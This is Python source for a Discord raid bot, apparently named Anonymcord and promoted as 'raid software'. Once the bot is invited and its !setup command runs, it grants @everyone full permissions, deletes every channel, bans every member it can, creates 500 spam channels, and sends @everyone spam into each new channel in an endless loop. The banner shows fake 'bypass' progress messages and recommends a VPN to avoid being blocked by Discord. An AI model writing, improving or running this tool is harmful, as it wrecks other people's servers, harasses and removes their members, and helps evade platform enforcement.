import discord
from discord.ext import commands
import random
from discord import Permissions
from colorama import Fore, Style
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
import asyncio

SPAM_MESSAGE = ["**Raid by the number 1 anonymous raid software, ANONYMCORD.** ||@everyone||"]
SPAM_CHANNEL = ["anonym-raid", "anonymcord", "raid", "anonym", "software"]

client = commands.Bot(command_prefix="!")


if True:

      print(Colorate.Horizontal(Colors.blue_to_purple, """


   

              __                  __   __   __   __             
              /\  |\ | /  \ |\ | \ /  |\/| /  ` /  \ |__) |  \
                                                    
             /~~\ | \| \__/ | \|  |   |  | \__, \__/ |  \ |__/


 
                                                  
                            
                                                                                        
[..] The Number 1 Anonymous Discord Raid Software..                                                                                                                                                                                                                                                                                                                       
[/!\] To avoid being blocked by discord for a few hours, 
I advise you to put yourself under VPN when you use Dark Vador."""))
      print('')

      print(Fore.RED + """[...] Anonymcord is actually: [OFF].""")
      print(Fore.WHITE + "")
      print("")
      token = Write.Input("[?] Enter the Token Bot. -> ", Colors.blue_to_purple, interval=0.0025)
      print("")
      print(Fore.BLUE + """
Checking if the Token works...
Connect the Token to Discord...
Turn on Free Hosting of anonymcord...
Generating Channels that I have to create...
ByPass the @everyone forbidden...
Dark Vador will be connected in a very short time...
ByPass all verification(s)...
[OFF] to [ON]...
Searching the Anonym server...
Anonym server 000.01 found !
Making the final content...""")
      print("")
      print(Fore.GREEN + "[>..] Anonymcord is now [ON] !")
      print(Fore.GREEN + '[+] Invite the bot in a server and execute the command " !setup " to start the Dark Raid!')

@client.event
async def on_ready():
     await client.change_presence(activity=discord.Game(name="Execute the command !setup to setup the bot !"))

@client.command()
async def setup (ctx):
    guild = ctx.guild
    try:
      role = discord.utils.get(guild.roles, name = "@everyone")
      await role.edit(permissions = Permissions.all())
      print(Fore.GREEN + "[ANONYMCORD] - [SUCCESS] - I have given everyone admin." + Fore.RESET)
    except:
      print(Fore.GREEN + "[ANONYMCORD] - [SUCCESS] - I was unable to give everyone admin" + Fore.RESET)
    for channel in guild.channels:
      try:
        await channel.delete()
        print(Fore.GREEN + f"[ANONYMCORD] - [SUCCESS] - {channel.name} was deleted." + Fore.RESET)
      except:
        print(Fore.GREEN + f"[ANONYMCORD] - [SUCCESS] - {channel.name} was NOT deleted." + Fore.RESET)
    for member in guild.members:
     try:
       await member.ban()
       print(Fore.GREEN + f"[ANONYMCORD] - [SUCCESS] - {member.name}#{member.discriminator} Was banned" + Fore.RESET)
     except:
       print(Fore.GREEN + f"[ANONYMCORD] - [SUCCESS] - {member.name}#{member.discriminator} Was unable to be banned." + Fore.RESET)
    await guild.create_text_channel("ANONYMCORD")
    for channel in guild.text_channels:
        link = await channel.create_invite(max_age = 0, max_uses = 0)
        print(f"[ANONYMCORD] - [SUCCESS] - New Invite: {link}")
    amount = 500
    for i in range(amount):
       await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    print(f"[ANONYMCORD] - [SUCCESS] - Nuked {guild.name} Successfully.")
    return

@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))
client.run(token, bot=True)